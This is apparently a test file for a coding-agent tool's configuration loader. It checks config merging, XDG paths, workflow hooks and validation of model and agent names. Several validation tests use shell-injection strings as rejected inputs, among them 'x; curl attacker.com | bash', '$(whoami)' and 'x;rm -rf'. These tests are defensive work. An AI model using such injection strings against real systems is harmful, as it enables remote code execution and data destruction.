import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import {
  AgentNameSchema,
  CoderConfigSchema,
  deepMerge,
  HookSchema,
  loadConfig,
  resolveConfig,
  userConfigDir,
  userConfigPath,
} from "../src/config.js";

test("deepMerge: arrays replace, not concat", () => {
  const base = { items: [1, 2, 3] };
  const override = { items: [4, 5] };
  const result = deepMerge(base, override);
  assert.deepEqual(result, { items: [4, 5] });
});

test("deepMerge: null values override", () => {
  const base = { a: { b: 1 } };
  const override = { a: null };
  const result = deepMerge(base, override);
  assert.equal(result.a, null);
});

test("deepMerge: undefined values are skipped", () => {
  const base = { a: 1, b: 2 };
  const override = { a: undefined, b: 3 };
  const result = deepMerge(base, override);
  assert.deepEqual(result, { a: 1, b: 3 });
});

test("loadConfig: no files returns all defaults", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    const defaults = CoderConfigSchema.parse({});
    assert.deepEqual(config, defaults);
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("loadConfig: user config only merges with defaults", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  mkdirSync(path.join(xdg, "coder"), { recursive: true });
  writeFileSync(
    path.join(xdg, "coder", "config.json"),
    JSON.stringify({
      verbose: true,
      models: { claude: "claude-sonnet-4-5-20250929" },
    }),
  );

  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    assert.equal(config.verbose, true);
    assert.equal(config.models.claude.model, "claude-sonnet-4-5-20250929");
    assert.equal(config.models.gemini.model, "gemini-3-flash-preview"); // default preserved
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("loadConfig: repo config overrides user config", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const xdg = mkdtempSync(path.join(os.tmpdir(), "coder-xdg-"));
  mkdirSync(path.join(xdg, "coder"), { recursive: true });
  writeFileSync(
    path.join(xdg, "coder", "config.json"),
    JSON.stringify({ ppcommit: { blockTodos: false }, verbose: true }),
  );
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({ ppcommit: { blockTodos: true }, verbose: false }),
  );

  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = xdg;
  try {
    const config = loadConfig(dir);
    assert.equal(config.ppcommit.blockTodos, true); // repo wins
    assert.equal(config.verbose, false); // repo wins
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("resolveConfig: CLI overrides win over all", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  writeFileSync(
    path.join(dir, "coder.json"),
    JSON.stringify({ verbose: false }),
  );
  const config = resolveConfig(dir, { verbose: true });
  assert.equal(config.verbose, true);
});

test("resolveConfig: deep overrides merge correctly", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, { test: { command: "npm test" } });
  assert.equal(config.test.command, "npm test");
  assert.equal(config.test.timeoutMs, 600000); // default preserved
});

test("resolveConfig: workflow agent roles can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: {
      agentRoles: {
        planner: "codex",
        programmer: "codex",
        reviewer: "claude",
      },
    },
  });
  assert.equal(config.workflow.agentRoles.issueSelector, "gemini");
  assert.equal(config.workflow.agentRoles.planner, "codex");
  assert.equal(config.workflow.agentRoles.programmer, "codex");
  assert.equal(config.workflow.agentRoles.reviewer, "claude");
  assert.equal(config.workflow.wip.push, true);
  assert.equal(config.workflow.wip.autoCommit, true);
  assert.equal(config.workflow.scratchpad.sqliteSync, true);
});

test("resolveConfig: workflow durability settings can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: {
      wip: {
        push: true,
        autoCommit: false,
        includeUntracked: true,
        remote: "backup",
      },
      scratchpad: {
        sqliteSync: true,
        sqlitePath: ".coder/custom-state.db",
      },
    },
  });
  assert.equal(config.workflow.wip.push, true);
  assert.equal(config.workflow.wip.autoCommit, false);
  assert.equal(config.workflow.wip.includeUntracked, true);
  assert.equal(config.workflow.wip.remote, "backup");
  assert.equal(config.workflow.scratchpad.sqlitePath, ".coder/custom-state.db");
});

test("resolveConfig: ppcommit llm settings can be overridden", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    ppcommit: {
      enableLlm: false,
      llmServiceUrl: "https://example.com/v1",
      llmModelRef: "claude",
    },
  });
  assert.equal(config.ppcommit.enableLlm, false);
  assert.equal(config.ppcommit.llmServiceUrl, "https://example.com/v1");
  assert.equal(config.ppcommit.llmModelRef, "claude");
});

test("userConfigPath: respects XDG_CONFIG_HOME", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = "/custom/config";
  try {
    assert.equal(userConfigPath(), "/custom/config/coder/config.json");
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("userConfigDir: respects XDG_CONFIG_HOME", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = "/custom/config";
  try {
    assert.equal(userConfigDir(), "/custom/config/coder");
  } finally {
    if (origXdg === undefined) delete process.env.XDG_CONFIG_HOME;
    else process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("userConfigPath: falls back to ~/.config", () => {
  const origXdg = process.env.XDG_CONFIG_HOME;
  delete process.env.XDG_CONFIG_HOME;
  try {
    const expected = path.join(os.homedir(), ".config", "coder", "config.json");
    assert.equal(userConfigPath(), expected);
  } finally {
    if (origXdg !== undefined) process.env.XDG_CONFIG_HOME = origXdg;
  }
});

test("CoderConfigSchema rejects model names with shell injection characters", () => {
  assert.throws(
    () =>
      CoderConfigSchema.parse({
        models: { gemini: { model: "x; curl attacker.com | bash" } },
      }),
    /Invalid model name/,
  );
  assert.throws(
    () =>
      CoderConfigSchema.parse({
        models: { claude: { model: "model$(whoami)" } },
      }),
    /Invalid model name/,
  );
  // Valid model names should pass
  const parsed = CoderConfigSchema.parse({
    models: {
      gemini: { model: "gemini-2.5-flash" },
      claude: { model: "claude-opus-4-6" },
    },
  });
  assert.equal(parsed.models.gemini.model, "gemini-2.5-flash");
  assert.equal(parsed.models.claude.model, "claude-opus-4-6");
});

test("CoderConfigSchema accepts model names with slashes and dots", () => {
  const parsed = CoderConfigSchema.parse({
    models: { gemini: { model: "models/gemini-2.5-flash-preview" } },
  });
  assert.equal(parsed.models.gemini.model, "models/gemini-2.5-flash-preview");
});

test("HookSchema: valid hook parses correctly", () => {
  const hook = HookSchema.parse({
    on: "machine_complete",
    machine: "issue-draft",
    run: "echo done",
  });
  assert.equal(hook.on, "machine_complete");
  assert.equal(hook.machine, "issue-draft");
  assert.equal(hook.run, "echo done");
});

test("HookSchema: machine field is optional", () => {
  const hook = HookSchema.parse({ on: "machine_start", run: "echo start" });
  assert.equal(hook.machine, undefined);
});

test("HookSchema: invalid regex machine pattern is rejected", () => {
  assert.throws(
    () =>
      HookSchema.parse({ on: "machine_complete", machine: "(", run: "echo x" }),
    /Invalid regex/,
  );
});

test("CoderConfigSchema: workflow.hooks defaults to empty array", () => {
  const config = CoderConfigSchema.parse({});
  assert.deepEqual(config.workflow.hooks, []);
});

test("HookSchema: accepts workflow_complete event type", () => {
  const hook = HookSchema.parse({ on: "workflow_complete", run: "echo done" });
  assert.equal(hook.on, "workflow_complete");
});

test("HookSchema: accepts workflow_start and workflow_failed event types", () => {
  assert.doesNotThrow(() =>
    HookSchema.parse({ on: "workflow_start", run: "echo s" }),
  );
  assert.doesNotThrow(() =>
    HookSchema.parse({ on: "workflow_failed", run: "echo f" }),
  );
});

test("HookSchema: accepts loop_start and loop_complete event types", () => {
  assert.doesNotThrow(() =>
    HookSchema.parse({ on: "loop_start", run: "echo s" }),
  );
  assert.doesNotThrow(() =>
    HookSchema.parse({ on: "loop_complete", run: "echo c" }),
  );
});

test("HookSchema: accepts all issue event types", () => {
  for (const ev of [
    "issue_start",
    "issue_complete",
    "issue_failed",
    "issue_skipped",
    "issue_deferred",
  ]) {
    assert.doesNotThrow(
      () => HookSchema.parse({ on: ev, run: "echo x" }),
      `should accept ${ev}`,
    );
  }
});

test("HookSchema: rejects unknown event type", () => {
  assert.throws(
    () => HookSchema.parse({ on: "bad_event", run: "echo x" }),
    /Invalid/,
  );
});

test("AgentNameSchema: accepts custom agent names", () => {
  assert.equal(AgentNameSchema.parse("aider"), "aider");
  assert.equal(AgentNameSchema.parse("cursor"), "cursor");
  assert.equal(AgentNameSchema.parse("my-agent.v2"), "my-agent.v2");
});

test("AgentNameSchema: rejects empty string", () => {
  assert.throws(() => AgentNameSchema.parse(""), /Invalid/);
});

test("AgentNameSchema: rejects path separators", () => {
  assert.throws(() => AgentNameSchema.parse("foo/bar"), /Invalid/);
});

test("AgentNameSchema: rejects shell metacharacters", () => {
  assert.throws(() => AgentNameSchema.parse("x;rm -rf"), /Invalid/);
  assert.throws(() => AgentNameSchema.parse("$(whoami)"), /Invalid/);
});

test("resolveConfig: custom agent names in agentRoles", () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
  const config = resolveConfig(dir, {
    workflow: { agentRoles: { planner: "aider", reviewer: "cursor" } },
  });
  assert.equal(config.workflow.agentRoles.planner, "aider");
  assert.equal(config.workflow.agentRoles.reviewer, "cursor");
  assert.equal(config.workflow.agentRoles.issueSelector, "gemini");
});

test("CoderConfigSchema: custom agent names in fallback", () => {
  const parsed = CoderConfigSchema.parse({
    agents: { fallback: { planner: "cursor" } },
  });
  assert.equal(parsed.agents.fallback.planner, "cursor");
});
